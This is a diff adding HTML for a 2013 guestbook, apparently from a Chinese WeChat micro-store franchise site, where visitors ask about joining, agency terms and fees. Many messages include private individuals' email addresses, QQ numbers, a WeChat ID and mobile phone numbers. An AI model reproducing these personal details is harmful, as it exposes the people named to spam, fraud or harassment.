+								<dt class="hfinfo" date="9331">你好！我想知道怎么才能够加盟这个微店呢？加盟需要资金吗？加盟需要些什么条件呢？ 我的QQ邮箱1094133855@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9331" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9331">
+											<textarea name="info" class="pxtextarea hly9331"></textarea> 
+										<a class="hhsubmit submit" date="9331" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：这个可以加盟 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								石家庄<span>2013-12-09 20:21:36</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9332">你好！我想知道怎么才能够加盟这个微店呢？加盟需要资金吗？加盟需要些什么条件呢？ 我的QQ邮箱1094133855@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9332" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9332">
+											<textarea name="info" class="pxtextarea hly9332"></textarea> 
+										<a class="hhsubmit submit" date="9332" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								西北地区<span>2013-12-09 20:12:50</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9329">  你好，如何代理，什么样的程序详细一点介绍一下谢谢。我的邮箱1150757032@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9329" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9329">
+											<textarea name="info" class="pxtextarea hly9329"></textarea> 
+										<a class="hhsubmit submit" date="9329" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								周明波<span>2013-12-09 10:14:36</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9165">你好！我想知道怎么才能够加盟这个微店呢？加盟需要资金吗？加盟需要些什么条件呢？ 我的QQ邮箱1424507638@qq.com
+联系电话:18290495464</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9165" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9165">
+											<textarea name="info" class="pxtextarea hly9165"></textarea> 
+										<a class="hhsubmit submit" date="9165" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								你好<span>2013-12-09 09:30:38</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9155">未来的市场…好想了解知道我怎么才能够加盟这个微店呢？加盟需要资金吗？加盟需要些什么条件呢？ 我的QQ邮箱1424507638@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9155" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9155">
+											<textarea name="info" class="pxtextarea hly9155"></textarea> 
+										<a class="hhsubmit submit" date="9155" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								&煙@鈥&<span>2013-12-09 02:36:46</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="9139">本人想加盟，但不知道程序怎么走？能否寄详细资料过来。</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="9139" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly9139">
+											<textarea name="info" class="pxtextarea hly9139"></textarea> 
+										<a class="hhsubmit submit" date="9139" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小九<span>2013-12-05 09:25:33</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="8342">如何加盟？具体细则能否发送343000406@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="8342" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly8342">
+											<textarea name="info" class="pxtextarea hly8342"></textarea> 
+										<a class="hhsubmit submit" date="8342" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小城<span>2013-12-05 09:20:51</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="8340">请问如何与贵公司合作，谢谢。。</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="8340" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly8340">
+											<textarea name="info" class="pxtextarea hly8340"></textarea> 
+										<a class="hhsubmit submit" date="8340" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								余金美<span>2013-12-04 10:31:26</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="8135">请发加盟资料到102533730@QQ.com,</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="8135" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly8135">
+											<textarea name="info" class="pxtextarea hly8135"></textarea> 
+										<a class="hhsubmit submit" date="8135" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小英<span>2013-12-04 08:43:18</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="8100">问一下 做微商城费用如何计算？ 微信号：jin-meiying 谢谢</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="8100" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly8100">
+											<textarea name="info" class="pxtextarea hly8100"></textarea> 
+										<a class="hhsubmit submit" date="8100" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								曹立<span>2013-12-04 01:26:58</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="8084">如何于贵公司合作、做一个微商城需要多少钱</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="8084" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly8084">
+											<textarea name="info" class="pxtextarea hly8084"></textarea> 
+										<a class="hhsubmit submit" date="8084" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>幽幽回复：可以官网上询问客服 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								稻草人<span>2013-12-02 21:31:16</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7800">想了解具体代理条件，资金，政策等内容，请将资料发送邮箱：yjmkm@sina.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7800" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7800">
+											<textarea name="info" class="pxtextarea hly7800"></textarea> 
+										<a class="hhsubmit submit" date="7800" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								广州<span>2013-12-02 17:02:08</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7756">怎么注册微信公众平台</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7756" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7756">
+											<textarea name="info" class="pxtextarea hly7756"></textarea> 
+										<a class="hhsubmit submit" date="7756" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈哈<span>2013-12-02 14:40:15</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7708">很不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7708" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7708">
+											<textarea name="info" class="pxtextarea hly7708"></textarea> 
+										<a class="hhsubmit submit" date="7708" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小菜<span>2013-12-02 12:41:25</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7674">请问如何与贵公司合作？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7674" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7674">
+											<textarea name="info" class="pxtextarea hly7674"></textarea> 
+										<a class="hhsubmit submit" date="7674" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								河南<span>2013-12-02 10:13:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7644">想加入</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7644" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7644">
+											<textarea name="info" class="pxtextarea hly7644"></textarea> 
+										<a class="hhsubmit submit" date="7644" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								鱼鱼<span>2013-12-02 09:42:19</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7633">加盟有什么政策？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7633" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7633">
+											<textarea name="info" class="pxtextarea hly7633"></textarea> 
+										<a class="hhsubmit submit" date="7633" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								清苑<span>2013-12-01 23:23:19</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7620">如何加盟，河北地区！请回复</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7620" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7620">
+											<textarea name="info" class="pxtextarea hly7620"></textarea> 
+										<a class="hhsubmit submit" date="7620" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								执着<span>2013-12-01 16:31:41</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7569">做个微商城多少钱？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7569" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7569">
+											<textarea name="info" class="pxtextarea hly7569"></textarea> 
+										<a class="hhsubmit submit" date="7569" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								执着<span>2013-12-01 16:27:27</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7568">加盟方法发来看看，106565950@qq.con,</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7568" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7568">
+											<textarea name="info" class="pxtextarea hly7568"></textarea> 
+										<a class="hhsubmit submit" date="7568" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								万和堂<span>2013-12-01 15:25:35</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7565">加盟代理全国合作</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7565" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7565">
+											<textarea name="info" class="pxtextarea hly7565"></textarea> 
+										<a class="hhsubmit submit" date="7565" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								大非<span>2013-12-01 14:36:07</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7557">区域代理怎么做的，有没相关的资料发到我QQ邮箱：16809705@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7557" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7557">
+											<textarea name="info" class="pxtextarea hly7557"></textarea> 
+										<a class="hhsubmit submit" date="7557" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								A-xiu<span>2013-12-01 14:14:31</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7556">做服务号怎么收费？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7556" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7556">
+											<textarea name="info" class="pxtextarea hly7556"></textarea> 
+										<a class="hhsubmit submit" date="7556" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								80后 加盟<span>2013-12-01 11:22:21</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7536">怎么参与卖产品啊，费用多少，我微信号:13856072713。看到信息回复哦</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7536" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7536">
+											<textarea name="info" class="pxtextarea hly7536"></textarea> 
+										<a class="hhsubmit submit" date="7536" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								佼佼<span>2013-12-01 10:48:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7531">我是食品加工行业的，主要生产面条，这个能适合我吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7531" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7531">
+											<textarea name="info" class="pxtextarea hly7531"></textarea> 
+										<a class="hhsubmit submit" date="7531" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								喜洋洋<span>2013-12-01 08:13:20</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7523">我想加盟请与我联系qq：1047125084</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7523" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7523">
+											<textarea name="info" class="pxtextarea hly7523"></textarea> 
+										<a class="hhsubmit submit" date="7523" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								贵州地区<span>2013-11-30 21:23:45</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7502">想了解有关微店相关情况，电话，18212561111</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7502" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7502">
+											<textarea name="info" class="pxtextarea hly7502"></textarea> 
+										<a class="hhsubmit submit" date="7502" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								沈阳地区<span>2013-11-30 19:10:33</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7494">我想开微店，但不知道怎样申请，请给我回复</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7494" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7494">
+											<textarea name="info" class="pxtextarea hly7494"></textarea> 
+										<a class="hhsubmit submit" date="7494" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小建<span>2013-11-30 10:38:08</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7434">如何加盟
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7434" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7434">
+											<textarea name="info" class="pxtextarea hly7434"></textarea> 
+										<a class="hhsubmit submit" date="7434" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								小付<span>2013-11-29 23:10:58</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7407">想建微商城，请联系我</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7407" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7407">
+											<textarea name="info" class="pxtextarea hly7407"></textarea> 
+										<a class="hhsubmit submit" date="7407" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								Hadi<span>2013-11-29 21:48:18</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7392">做微商城多少钱</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7392" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7392">
+											<textarea name="info" class="pxtextarea hly7392"></textarea> 
+										<a class="hhsubmit submit" date="7392" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								siwjsjs<span>2013-11-29 15:28:15</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7328">很有商机，很想了解合作，请联系我
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7328" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7328">
+											<textarea name="info" class="pxtextarea hly7328"></textarea> 
+										<a class="hhsubmit submit" date="7328" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								陕西地区<span>2013-11-29 10:05:30</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7256">可以把资料发我一分么？547019007@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7256" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7256">
+											<textarea name="info" class="pxtextarea hly7256"></textarea> 
+										<a class="hhsubmit submit" date="7256" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								陕西地区<span>2013-11-29 10:03:26</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7255">你好我问下这个怎么做，大概要多少钱呢？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7255" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7255">
+											<textarea name="info" class="pxtextarea hly7255"></textarea> 
+										<a class="hhsubmit submit" date="7255" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								石头<span>2013-11-29 07:05:29</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7243">15225192521 我是微通天下微营销河南分公司  需要咨询</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7243" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7243">
+											<textarea name="info" class="pxtextarea hly7243"></textarea> 
+										<a class="hhsubmit submit" date="7243" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								看看<span>2013-11-28 23:11:57</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7229">怎么代理</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7229" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7229">
+											<textarea name="info" class="pxtextarea hly7229"></textarea> 
+										<a class="hhsubmit submit" date="7229" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								smooth504<span>2013-11-28 22:00:27</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7224">很有商机，很想了解合作，请联系我</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7224" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7224">
+											<textarea name="info" class="pxtextarea hly7224"></textarea> 
+										<a class="hhsubmit submit" date="7224" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>陕西地区回复：如何收费 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								不错<span>2013-11-28 19:11:31</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7208">很不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7208" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7208">
+											<textarea name="info" class="pxtextarea hly7208"></textarea> 
+										<a class="hhsubmit submit" date="7208" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								xzgw365<span>2013-11-28 17:45:27</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7202">不知道怎么加盟啊~</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7202" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7202">
+											<textarea name="info" class="pxtextarea hly7202"></textarea> 
+										<a class="hhsubmit submit" date="7202" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								2591980927<span>2013-11-28 17:10:18</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7193">我想了解，可以发一些资料我吗？邮箱。925721348@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7193" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7193">
+											<textarea name="info" class="pxtextarea hly7193"></textarea> 
+										<a class="hhsubmit submit" date="7193" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								大森林<span>2013-11-28 15:52:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="7155">商城怎么收费？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="7155" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly7155">
+											<textarea name="info" class="pxtextarea hly7155"></textarea> 
+										<a class="hhsubmit submit" date="7155" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								广东地区<span>2013-11-28 05:46:22</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6941">可以加深了解吗?请更我联系13927208319陈</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6941" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6941">
+											<textarea name="info" class="pxtextarea hly6941"></textarea> 
+										<a class="hhsubmit submit" date="6941" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								莘叶风棱<span>2013-11-27 23:11:04</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6925">请问如何加盟 谢谢</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6925" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6925">
+											<textarea name="info" class="pxtextarea hly6925"></textarea> 
+										<a class="hhsubmit submit" date="6925" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								阿东<span>2013-11-27 22:32:25</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6922">想代理浙江</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
